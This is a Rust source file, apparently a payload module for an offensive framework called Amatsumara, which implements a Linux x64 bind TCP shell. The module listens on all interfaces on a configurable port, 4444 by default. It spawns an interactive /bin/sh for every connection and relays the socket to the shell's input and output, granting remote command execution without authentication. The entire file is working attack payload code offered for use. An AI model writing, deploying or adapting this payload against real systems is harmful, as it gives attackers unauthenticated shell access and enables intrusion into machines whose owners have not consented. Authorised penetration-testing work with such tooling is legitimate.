use amatsumara_api::*;
use std::ffi::{c_char, c_int, c_void, CStr};
use std::net::SocketAddr;
use std::process::{Command, Stdio};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

// Static metadata
static NAME: &str = "Linux x64 Bind TCP Shell";
static DESCRIPTION: &str = "Binds to a port and spawns a shell when connected to";
static AUTHOR: &str = "Amatsumara Project";

static PLATFORMS: &[Platform] = &[Platform::Linux];
static ARCHS: &[Arch] = &[Arch::X64];

// Option definitions
static LPORT_NAME: &str = "LPORT";
static LPORT_DESC: &str = "Local port to bind to";
static LPORT_DEFAULT: &str = "4444";

static OPTIONS: &[ModuleOption] = &[
    ModuleOption {
        name: CString { ptr: LPORT_NAME.as_ptr() as *const c_char, len: LPORT_NAME.len() },
        description: CString { ptr: LPORT_DESC.as_ptr() as *const c_char, len: LPORT_DESC.len() },
        required: true,
        option_type: OptionType::Port,
        default_value: CString { ptr: LPORT_DEFAULT.as_ptr() as *const c_char, len: LPORT_DEFAULT.len() },
    },
];

static MODULE_INFO: ModuleInfo = ModuleInfo {
    api_version: MODULE_API_VERSION,
    metadata: ModuleMetadata {
        name: CString { ptr: NAME.as_ptr() as *const c_char, len: NAME.len() },
        description: CString { ptr: DESCRIPTION.as_ptr() as *const c_char, len: DESCRIPTION.len() },
        author: CString { ptr: AUTHOR.as_ptr() as *const c_char, len: AUTHOR.len() },
        module_type: ModuleType::Payload,
        platforms: PlatformArray { ptr: PLATFORMS.as_ptr(), len: PLATFORMS.len() },
        archs: ArchArray { ptr: ARCHS.as_ptr(), len: ARCHS.len() },
        ranking: Ranking::Normal,
        privileged: false,
    },
    options: OptionArray { ptr: OPTIONS.as_ptr(), len: OPTIONS.len() },
};

struct PayloadModule {
    lport: u16,
}

impl PayloadModule {
    fn new() -> Box<Self> {
        Box::new(Self { lport: 4444 })
    }

    async fn handle_connection(&self, stream: TcpStream) -> std::io::Result<()> {
        eprintln!("[*] Incoming connection from: {}", stream.peer_addr()?);

        // Use socat or nc-style redirection via /bin/sh
        // This is simpler and more portable than managing stdio pipes

        // Split stream for reading and writing
        let (mut reader, mut writer) = stream.into_split();

        // Spawn shell with redirected I/O
        let mut child = Command::new("/bin/sh")
            .arg("-i")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()?;

        let mut child_stdin = child.stdin.take().unwrap();
        let mut child_stdout = child.stdout.take().unwrap();

        // Spawn tasks to handle I/O
        let reader_handle = tokio::spawn(async move {
            let mut buf = vec![0u8; 4096];
            loop {
                match reader.read(&mut buf).await {
                    Ok(0) => break,
                    Ok(n) => {
                        use std::io::Write;
                        if child_stdin.write_all(&buf[..n]).is_err() {
                            break;
                        }
                        let _ = child_stdin.flush();
                    }
                    Err(_) => break,
                }
            }
        });

        let writer_handle = tokio::spawn(async move {
            let mut buf = vec![0u8; 4096];
            loop {
                use std::io::Read;
                match child_stdout.read(&mut buf) {
                    Ok(0) => break,
                    Ok(n) => {
                        if writer.write_all(&buf[..n]).await.is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
                tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
            }
        });

        // Wait for either task to complete
        tokio::select! {
            _ = reader_handle => {},
            _ = writer_handle => {},
        }

        let _ = child.kill();
        Ok(())
    }

    async fn run_payload(&self) -> i32 {
        let addr: SocketAddr = format!("0.0.0.0:{}", self.lport).parse().unwrap();

        eprintln!("[*] Starting bind shell on port {}", self.lport);

        let listener = match TcpListener::bind(addr).await {
            Ok(l) => l,
            Err(e) => {
                eprintln!("[-] Failed to bind to port {}: {}", self.lport, e);
                return -1;
            }
        };

        eprintln!("[+] Bind shell listening on {}", addr);

        loop {
            match listener.accept().await {
                Ok((stream, _addr)) => {
                    let _ = self.handle_connection(stream).await;
                }
                Err(e) => {
                    eprintln!("[-] Accept failed: {}", e);
                }
            }
        }
    }
}

extern "C" fn get_info() -> *const ModuleInfo {
    &MODULE_INFO
}

extern "C" fn init() -> *mut c_void {
    let module = PayloadModule::new();
    Box::into_raw(module) as *mut c_void
}

extern "C" fn destroy(instance: *mut c_void) {
    if !instance.is_null() {
        unsafe {
            let _ = Box::from_raw(instance as *mut PayloadModule);
        }
    }
}

extern "C" fn run(instance: *mut c_void, options_json: *const c_char) -> c_int {
    if instance.is_null() {
        eprintln!("[-] Module instance is null");
        return -1;
    }

    let module = unsafe { &mut *(instance as *mut PayloadModule) };

    // Parse options from JSON
    if !options_json.is_null() {
        let c_str = unsafe { CStr::from_ptr(options_json) };
        if let Ok(json_str) = c_str.to_str() {
            if let Ok(opts) = serde_json::from_str::<serde_json::Value>(json_str) {
                if let Some(v) = opts.get("LPORT").and_then(|v| v.as_str()) {
                    if let Ok(p) = v.parse::<u16>() { module.lport = p; }
                }
            }
        }
    }

    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(module.run_payload())
}

static VTABLE: ModuleVTable = ModuleVTable {
    get_info,
    init,
    destroy,
    check: None,
    run,
};

#[no_mangle]
pub extern "C" fn amatsumara_module_init() -> *const ModuleVTable {
    &VTABLE
}
